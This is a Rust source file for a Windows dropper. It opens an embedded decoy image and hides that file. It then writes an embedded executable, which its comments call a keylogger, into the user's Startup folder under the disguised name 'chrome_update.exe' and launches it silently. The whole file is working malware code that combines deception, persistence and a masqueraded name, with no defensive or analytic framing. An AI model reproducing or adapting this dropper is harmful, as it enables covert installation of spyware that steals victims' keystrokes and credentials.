use std::fs::File;
use std::io::prelude::*;
use std::path::PathBuf;
use std::process::Command;

// Include the image file as a binary blob
const IMAGE_DATA: &'static [u8] = include_bytes!("image.jpg");
const IMAGE_FILE_OUT: &'static str = "./golzar.jpg";

// Include the exe file as a binary blob
const EXE_DATA: &'static [u8] = include_bytes!("app.exe");
// Name of keylogger (vlc, chrome,...)
const EXE_NAME: &'static str = "chrome_update.exe";

fn main() {
    write_image_file();

    // Open the image with the default program
    match Command::new("cmd")
        .args(&["/C", "start", "/B", IMAGE_FILE_OUT]) // add /B argument to start process in the background
        .spawn()// use spawn instead of status to not wait for the process to finish
    {
        Ok(_) => {
            debug_print(format!("Successfully opened the image."));
        }
        Err(e) => {
            debug_print(format!("Failed to execute command: {}", e));
        }
    };

    // Part 2:  Write the keylogger to the startup folder

    let startup_dir = match get_startup_dir() {
        Some(dir) => dir,
        None => {
            debug_print(format!("Failed to get the Startup directory"));
            return;
        }
    };

    let exe_file_out_opt = write_app_file();
    match exe_file_out_opt {
        Some(exe_file_out) => {
            // Attempt to run the .exe file
            match Command::new(&exe_file_out).spawn() {
                Ok(child) => {
                    debug_print(format!("Successfully opened the .exe."));
                },
                Err(e) => {
                    debug_print(format!("Failed to execute .exe: {}", e))
                },
            };
        },
        None => {
            debug_print("Executable file was not created.".to_string());
        },
    }
}

fn write_image_file() {
    // Write the image to a file
    let mut file = match File::create(IMAGE_FILE_OUT) {
        Ok(file) => file,
        Err(e) => {
            debug_print(format!("Failed to create file: {}", e));
            return;
        }
    };

    if let Err(e) = file.write_all(IMAGE_DATA) {
        debug_print(format!("Failed to write to file: {}", e));
        return;
    }

    // Use the 'attrib' command to hide the file
    // This needs to be run in a subprocess, so it won't work if the Rust script is run in the background
    match Command::new("cmd")
        .args(&["/C", "attrib", "+H", IMAGE_FILE_OUT])
        .status()
    {
        Ok(status) => {
            if !status.success() {
                debug_print(format!("Command executed, but reported failure."));
            }
        }
        Err(e) => {
            debug_print(format!("Failed to execute command: {}", e))
        }
    };
}

fn write_app_file() -> Option<PathBuf> {
    let startup_dir = match get_startup_dir() {
        Some(dir) => dir,
        None => {
            debug_print(format!("Failed to get the Startup directory"));
            return None;
        }
    };

    let exe_file_out = startup_dir.join(EXE_NAME);

    // Write the exe to a file
    let mut file = match File::create(&exe_file_out) {
        Ok(file) => file,
        Err(e) => {
            debug_print(format!("Failed to create file: {}", e));
            return None;
        }
    };

    if let Err(e) = file.write_all(EXE_DATA) {
        debug_print(format!("Failed to write to file: {}", e));
        return None;
    }

    Some(exe_file_out)
}

fn get_startup_dir() -> Option<PathBuf> {
    if let Some(mut path) = dirs::home_dir() {
        path.push(r"AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup");
        return Some(path);
    }
    None
}

fn debug_print( message: String) {
    if false {
        println!("{}", message);
    }
}
